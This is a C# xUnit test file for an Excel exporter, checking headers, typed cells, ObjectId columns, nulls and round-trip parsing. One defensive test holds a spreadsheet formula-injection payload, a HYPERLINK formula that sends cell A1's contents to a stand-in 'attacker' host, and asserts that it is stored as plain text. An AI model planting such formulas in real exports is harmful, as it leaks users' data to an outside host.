using ClosedXML.Excel;
using Foundry.FileIO;
using MongoDB.Bson;
using Xunit;

namespace Foundry.FileIO.Tests;

/// <summary>
/// <see cref="ExcelDataExporter{TIn}"/>, checked by reading what it wrote rather than by trusting it.
/// </summary>
/// <remarks>
/// A workbook with the wrong columns, or with every number stored as text, is still a valid
/// workbook -- the CSV export's ObjectId defect was exactly that shape and survived every test.
/// So each assertion opens the output: round-tripped through the framework's own parser where it
/// can read the type, and cell by cell where it cannot.
/// </remarks>
public class ExcelExportTests
{
    public enum Health { Green, Amber, Red }

    public sealed class Row
    {
        public string Name { get; set; } = string.Empty;
        public int Count { get; set; }
        public decimal Amount { get; set; }
        public DateTime Start { get; set; }
        public Health State { get; set; }
        public bool Active { get; set; }
    }

    public sealed class Keyed
    {
        public ObjectId Id { get; set; }
        public string Label { get; set; } = string.Empty;
        public decimal? Maybe { get; set; }
    }

    private static async IAsyncEnumerable<T> Stream<T>(params T[] items)
    {
        await Task.Yield();
        foreach (var item in items) yield return item;
    }

    private static async Task<MemoryStream> Export<T>(params T[] items)
    {
        var output = new MemoryStream();
        await new ExcelDataExporter<T>().ExportAsync(Stream(items), output);
        output.Position = 0;
        return output;
    }

    private static readonly Row Sample = new()
    {
        Name = "Payments", Count = 3, Amount = 1234.5m,
        Start = new DateTime(2026, 3, 2, 0, 0, 0, DateTimeKind.Utc), State = Health.Amber, Active = true
    };

    [Fact]
    public async Task WhatItWritesTheFrameworksOwnParserReadsBack()
    {
        using var file = await Export(Sample, new Row { Name = "Core", Count = 0, Amount = -7.25m, State = Health.Red });

        var rows = new List<Row>();
        await foreach (var r in new ExcelDataParser<Row>().ParseAsync(file)) rows.Add(r);

        Assert.Equal(2, rows.Count);
        Assert.Equal("Payments", rows[0].Name);
        Assert.Equal(3, rows[0].Count);
        Assert.Equal(1234.5m, rows[0].Amount);
        Assert.Equal(new DateTime(2026, 3, 2), rows[0].Start.Date);
        Assert.Equal(Health.Amber, rows[0].State);
        Assert.True(rows[0].Active);
        Assert.Equal(-7.25m, rows[1].Amount);
        Assert.Equal(Health.Red, rows[1].State);
    }

    [Fact]
    public async Task TheHeaderIsThePropertyNamesInDeclarationOrder()
    {
        using var file = await Export(Sample);
        using var book = new XLWorkbook(file);
        var header = book.Worksheet(1).Row(1).CellsUsed().Select(c => c.GetString());

        Assert.Equal(new[] { "Name", "Count", "Amount", "Start", "State", "Active" }, header);
    }

    [Fact]
    public async Task NumbersAndDatesAreTypedCellsSoTheyCanBeSummedAndSorted()
    {
        using var file = await Export(Sample);
        using var book = new XLWorkbook(file);
        var row = book.Worksheet(1).Row(2);

        Assert.Equal(XLDataType.Number, row.Cell(2).DataType);
        Assert.Equal(XLDataType.Number, row.Cell(3).DataType);
        Assert.Equal(XLDataType.DateTime, row.Cell(4).DataType);
        Assert.Equal(XLDataType.Text, row.Cell(5).DataType);
        Assert.Equal(XLDataType.Boolean, row.Cell(6).DataType);
    }

    [Fact]
    public async Task FormulaLookingTextIsStoredAsTextAndNeverEvaluated()
    {
        const string attack = "=HYPERLINK(\"http://attacker/?d=\"&A1,\"click\")";
        using var file = await Export(new Row { Name = attack });
        using var book = new XLWorkbook(file);
        var cell = book.Worksheet(1).Cell(2, 1);

        Assert.False(cell.HasFormula);
        Assert.Equal(XLDataType.Text, cell.DataType);
        Assert.Equal(attack, cell.GetString()); // exactly the stored value, no apostrophe
    }

    [Fact]
    public async Task AnObjectIdIsOneColumnHoldingItsHexString()
    {
        // The CSV exporter once replaced every id with Timestamp and CreationTime columns.
        var id = ObjectId.GenerateNewId();
        using var file = await Export(new Keyed { Id = id, Label = "x" });
        using var book = new XLWorkbook(file);
        var sheet = book.Worksheet(1);

        Assert.Equal(new[] { "Id", "Label", "Maybe" }, sheet.Row(1).CellsUsed().Select(c => c.GetString()));
        Assert.Equal(id.ToString(), sheet.Cell(2, 1).GetString());
    }

    [Fact]
    public async Task ANullIsABlankCellNotZero()
    {
        using var file = await Export(new Keyed { Id = ObjectId.GenerateNewId(), Maybe = null });
        using var book = new XLWorkbook(file);

        Assert.True(book.Worksheet(1).Cell(2, 3).IsEmpty());
    }

    [Fact]
    public async Task NoRowsIsAHeaderOnlyWorkbook()
    {
        using var file = await Export<Row>();
        using var book = new XLWorkbook(file);
        var sheet = book.Worksheet(1);

        Assert.Equal("Name", sheet.Cell(1, 1).GetString());
        Assert.Equal(1, sheet.LastRowUsed()!.RowNumber());
    }

    [Fact]
    public async Task TheOutputStreamIsLeftOpen()
    {
        // Callers write into a MemoryStream and then read its bytes into a file response.
        var output = new MemoryStream();
        await new ExcelDataExporter<Row>().ExportAsync(Stream(Sample), output);

        Assert.True(output.CanRead);
        Assert.True(output.Length > 0);
    }
}
